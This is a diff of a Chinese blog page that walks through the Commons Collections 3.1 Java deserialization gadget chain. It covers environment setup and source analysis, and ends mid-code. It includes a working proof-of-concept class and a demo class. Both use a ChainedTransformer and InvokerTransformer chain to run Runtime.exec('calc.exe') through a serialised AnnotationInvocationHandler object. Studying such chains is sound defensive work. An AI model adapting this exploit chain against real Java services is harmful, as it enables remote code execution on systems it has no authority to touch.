@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya3b0064s04z1hj24kkz" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyhm0064ys4zah6y6aw1" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -182,7 +182,76 @@
 <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要下载一些依赖环境：<code>CommonsCollections3.1</code>的源码和<code>zip</code>文件。<br><code>CommonsCollections3.1</code> 下载地址：<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-collections/download_collections.cgi">https://commons.apache.org/proper/commons-collections/download_collections.cgi</a></p>
 <h3 id="1、-配置运行环境"><a href="#1、-配置运行环境" class="headerlink" title="1、 配置运行环境"></a>1、<font color=cc66ff > 配置运行环境</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;新建Java项目，注意选择运行环境版本，使用<code>jdk1.7.0_80</code>。<br><img src="https://img-blog.csdnimg.cn/2021032909165185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>之后新建类<a id="1" ><code>Serialize_Test_Poc</code>：</a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize_Test_Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * //触发漏洞 Map.Entry onlyElement = (Map.Entry)</span></span><br><span class="line"><span class="comment">		 * outerMap.entrySet().iterator().next();</span></span><br><span class="line"><span class="comment">		 * //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，</span></span><br><span class="line"><span class="comment">		 * 这是map的键值对数据格式 onlyElement.setValue(&quot;foobar&quot;);</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//反射机制调用 AnnotationInvocationHandler 类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//返回指定参数类型的所有构造器，包括public的和非public的，当然也包括private的</span></span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        fin.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.*;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;
+
+
+<span class="hljs-keyword">import</span> java.io.FileInputStream;
+<span class="hljs-keyword">import</span> java.io.FileOutputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
+<span class="hljs-keyword">import</span> java.lang.annotation.Retention;
+<span class="hljs-keyword">import</span> java.lang.annotation.Target;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">import</span> java.io.*;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Serialize_Test_Poc</span> </span>&#123;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
+        <span class="hljs-comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span>
+        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;
+                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)
+        &#125;;
+
+        <span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span>
+        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+
+        <span class="hljs-comment">//创建Map并绑定transformerChina</span>
+        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
+        innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);
+        <span class="hljs-comment">//给予map数据转化链</span>
+        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);
+        
+        
+        
+		<span class="hljs-comment">/*</span>
+<span class="hljs-comment">		 * //触发漏洞 Map.Entry onlyElement = (Map.Entry)</span>
+<span class="hljs-comment">		 * outerMap.entrySet().iterator().next();</span>
+<span class="hljs-comment">		 * //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，</span>
+<span class="hljs-comment">		 * 这是map的键值对数据格式 onlyElement.setValue(&quot;foobar&quot;);</span>
+<span class="hljs-comment">		 */</span>
+        
+        <span class="hljs-comment">//反射机制调用 AnnotationInvocationHandler 类的构造函数</span>
+        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
+        <span class="hljs-comment">//返回指定参数类型的所有构造器，包括public的和非public的，当然也包括private的</span>
+        Constructor ctor = cl.getDeclaredConstructor(Class.class,Map.class);
+        <span class="hljs-comment">//取消构造函数修饰符限制</span>
+        ctor.setAccessible(<span class="hljs-keyword">true</span>);
+        <span class="hljs-comment">//获取实例</span>
+        Object instance = ctor.newInstance(Target.class, outerMap);
+        
+        
+        <span class="hljs-comment">//payload序列化写入文件，模拟网络传输</span>
+        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
+        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);
+        fout.writeObject(instance);
+        
+        <span class="hljs-comment">//服务端读取文件，反序列化，模拟网络传输</span>
+        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
+        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);
+        fin.readObject();
+        
+    &#125;
+&#125;
+</code></pre>
 <h3 id="2、-导入依赖包"><a href="#2、-导入依赖包" class="headerlink" title="2、 导入依赖包"></a>2、<font color=cc33ff > 导入依赖包</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选中项目右键配置Build path：<br><img src="https://img-blog.csdnimg.cn/20210323134155405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择Libraries =&gt; Add External JARS  =&gt;选择下载的文件=&gt; Apply and Close。<br><img src="https://img-blog.csdnimg.cn/20210323134312432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="3、-关联源文件"><a href="#3、-关联源文件" class="headerlink" title="3、 关联源文件"></a>3、<font color=cc00ff > 关联源文件</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在代码调试中要分析源文件，所以要关联源文件。使用Java Decompiler反编译<code>jre1.7.0_80\lib\rt.jar</code>,Java Decompiler下载地址：<br><a target="_blank" rel="noopener" href="http://java-decompiler.github.io/">http://java-decompiler.github.io/</a><br><img src="https://img-blog.csdnimg.cn/20210329102923681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把导出的zip文件丢在jre的目录下即可。<br><img src="https://img-blog.csdnimg.cn/20210329103611377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>选中项目，右键 =&gt; <code>Run As</code> =&gt; <code>Run Configurations</code><br><img src="https://img-blog.csdnimg.cn/20210323133746197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -190,34 +259,115 @@
 <p>如果没有配置就点击Add添加自己的jdk路径，添加之后选中并点击<code>Edit</code>。<br><img src="https://img-blog.csdnimg.cn/2021032910314523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>选择<code>rt.jar</code> =&gt; <code>Source Attachment</code> =&gt; <code>External location</code> =&gt; <code>External File</code>。<br><img src="https://img-blog.csdnimg.cn/2021032910340420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="二、代码分析"><a href="#二、代码分析" class="headerlink" title="二、代码分析"></a>二、代码分析</h1><h3 id="1、InvokerTransformer"><a href="#1、InvokerTransformer" class="headerlink" title="1、InvokerTransformer"></a>1、<font color=#ffff00 >InvokerTransformer</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CC3.1jar包中，InvokerTransformer的transform方法会通过反射机制去调用任意函数。<br>类所在路径:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/functors/InvokerTransformer.class</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">commons-collections-3.1.jar!/org/apache/commons/collections/functors/InvokerTransformer.class</code></pre>
 
 <p>查看源码：<br><img src="https://img-blog.csdnimg.cn/20210323162917905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实类<code>InvokerTransformer</code>是实现了<code>Transformer</code>接口，但由于<strong>接口回调</strong>的特性，执行的方法还是<code>InvokerTransformer</code>的<code>transform</code>方法。</p>
 <p><strong><code>Transformer</code></strong> 接口如下图所示：<img src="https://img-blog.csdnimg.cn/20210323164604458.png" alt="在这里插入图片描述"><br><code>InvokerTransformer</code>实现<code>Transformer</code>接口如下图所示：<br><img src="https://img-blog.csdnimg.cn/2021032316504098.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>可见通过多次调用<code>InvokerTransformer</code>的<code>transform</code>方法即可实现调用一条命令执行链。</p>
 <p>以<font color=#ff0000 >InvokerTransformerDemo </font>类为例：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformerDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//利用Java反射获取类对象</span></span><br><span class="line">		Class runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//利用InvokerTransformer的transform会通过反射机制去调用任意函数</span></span><br><span class="line">		<span class="comment">//返回 java.lang.Runtime的class对象-&gt;m_getMethod,可以类比下一行分析</span></span><br><span class="line">		<span class="comment">//java.lang.Runtime.getMethod(&quot;getRuntime&quot;) -&gt; 返回 java.lang.Runtime.getRuntime 方法</span></span><br><span class="line">		<span class="comment">//new Class[] 新建一个类数组，值为String.class,Class[].class</span></span><br><span class="line">		Object m_getMethod = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">				<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">				<span class="comment">//getMethod()的参数类型是&#123;&quot;getRuntime&quot;,null&#125;,所以new Class[]的类型为String.class</span></span><br><span class="line">				<span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				).transform(runtimeClass);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//java.lang.Runtime.getRuntime.invoke() -&gt; 返回 java.lang.Runtime.getRuntime() 对象</span></span><br><span class="line">		Object runtime = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">				<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">				<span class="comment">//invoke(对象，参数)，所以new Class[] 的类型为Object.class</span></span><br><span class="line">				<span class="keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				).transform(m_getMethod);</span><br><span class="line">		<span class="comment">//java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span></span><br><span class="line">		Object exec = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">				<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">				<span class="comment">//exec(&#x27;calc.exe&#x27;)只有一个参数，所以new Class[] 的类型为String.class</span></span><br><span class="line">				<span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">				).transform(runtime);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokerTransformerDemo</span> </span>&#123;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
+		
+		<span class="hljs-comment">//利用Java反射获取类对象</span>
+		Class runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);
+		
+		<span class="hljs-comment">//利用InvokerTransformer的transform会通过反射机制去调用任意函数</span>
+		<span class="hljs-comment">//返回 java.lang.Runtime的class对象-&gt;m_getMethod,可以类比下一行分析</span>
+		<span class="hljs-comment">//java.lang.Runtime.getMethod(&quot;getRuntime&quot;) -&gt; 返回 java.lang.Runtime.getRuntime 方法</span>
+		<span class="hljs-comment">//new Class[] 新建一个类数组，值为String.class,Class[].class</span>
+		Object m_getMethod = <span class="hljs-keyword">new</span> InvokerTransformer(
+				<span class="hljs-string">&quot;getMethod&quot;</span>, 
+				<span class="hljs-comment">//getMethod()的参数类型是&#123;&quot;getRuntime&quot;,null&#125;,所以new Class[]的类型为String.class</span>
+				<span class="hljs-keyword">new</span> Class[] &#123;String.class,Class[].class&#125;,
+				<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;
+				).transform(runtimeClass);
+		
+		<span class="hljs-comment">//java.lang.Runtime.getRuntime.invoke() -&gt; 返回 java.lang.Runtime.getRuntime() 对象</span>
+		Object runtime = <span class="hljs-keyword">new</span> InvokerTransformer(
+				<span class="hljs-string">&quot;invoke&quot;</span>,
+				<span class="hljs-comment">//invoke(对象，参数)，所以new Class[] 的类型为Object.class</span>
+				<span class="hljs-keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,
+				<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;
+				).transform(m_getMethod);
+		<span class="hljs-comment">//java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span>
+		Object exec = <span class="hljs-keyword">new</span> InvokerTransformer(
+				<span class="hljs-string">&quot;exec&quot;</span>,
+				<span class="hljs-comment">//exec(&#x27;calc.exe&#x27;)只有一个参数，所以new Class[] 的类型为String.class</span>
+				<span class="hljs-keyword">new</span> Class[] &#123;String.class&#125;,
+				<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;
+				).transform(runtime);	
+	&#125;
+&#125;</code></pre>
 
 <p>最终构成了一个命令执行链：<font color=#00ff00 >Class.forName(“java.lang.Runtime”).getMethod(“getRuntime”).invoke(null).exec(‘calc.exe’)</p>
 <h3 id="2、Transformer"><a href="#2、Transformer" class="headerlink" title="2、Transformer"></a>2、<font color=#ffcc00 >Transformer</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在知道InvokerTransformer的transform方法可以调用任意函数，现在需要查找调用transform方法的类。<br>其中有以下两个类：<font color=#0d00d6 >ConstantTransformer，ChainedTransformer</font>，<br><font color=#16e019 >ConstantTransformer</font>类实现了Transformer接口，transform会直接返回实例化时传入的对象。<br><font color=#16e019 >ConstantTransformer</font>路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/functors/ConstantTransformer.class</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">commons-collections-3.1.jar!/org/apache/commons/collections/functors/ConstantTransformer.class</code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20210323180200721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><font color=#f52c00 >ChainedTransformer</font>类也实现了Transformer接口，它的 transform ⽅法会循环调⽤ Transformer 数组对象中的 transform ⽅法，<strong>且上一次执行的结果会被当做下<br>一次调用</strong>，最终返回Transformer[]数组最后一个值执行后的对象Runtime。<br><font color=#f52c00 >ChainedTransformer</font> 路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/functors/ChainedTransformer.class</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">commons-collections-3.1.jar!/org/apache/commons/collections/functors/ChainedTransformer.class</code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20210323173051419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续执行，由于接口回调执行<code>InvokerTransformer</code>的<code>transform</code>方法，成功构成命令执行链。构造链是  <code>InvokerTransformer.transform()</code> =&gt; <code>Transformer.transform()</code><br><img src="https://img-blog.csdnimg.cn/202103231737566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以<code>reflectionChain</code>类为例：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span 